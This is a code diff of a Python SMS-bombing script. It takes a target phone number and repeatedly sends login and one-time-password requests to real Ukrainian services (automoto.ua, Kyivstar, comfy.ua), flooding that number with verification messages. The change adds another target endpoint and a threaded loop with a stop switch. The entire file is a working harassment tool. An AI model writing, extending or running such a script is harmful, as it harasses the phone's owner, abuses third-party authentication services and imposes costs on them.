@@ -1,14 +1,15 @@
-import random
 import time
 
 import requests
-from selenium import webdriver
-from selenium.webdriver.common.by import By
+
+import threading
+
+mutex = threading.Lock()
 
 
 def bombrer(number):
     try:
-
+        mutex.acquire()
         c = requests.post("https://automoto.ua/uk/my-office/login", json={"phone": f"38 0" + number})
         print(c.text)
         time.sleep(0.1)
@@ -21,13 +22,35 @@ def bombrer(number):
         cccc = requests.post("https://account.kyivstar.ua/cas/new/api/otp/send?locale=uk",
                              json={"action": "registration", "captcha": None, "login": f"380{number}"})
         print(cccc.text)
+        time.sleep(0.1)
+        comfy = requests.post("https://comfy.ua/api/auth/v3/otp/send",
+                              json={"phone": f"380{number}"})
+        print(comfy.text)
 
     except Exception as e:
         print(e)
+    finally:
+        mutex.release()
+
+
+treading_stop = False
+
+
+def stop():
+    global treading_stop
+    treading_stop = True
 
 
 def main(user_input_number, user_input_h):
+    global treading_stop
+    treading_stop = False
     user_input_howMuch = int(user_input_h)
-    for i in range(user_input_howMuch):
+    if user_input_howMuch == 1:
         bombrer(user_input_number)
-        time.sleep(60)
+    else:
+        for i in range(user_input_howMuch):
+            if treading_stop is False:
+                bombrer(user_input_number)
+                time.sleep(60)
+            else:
+                break
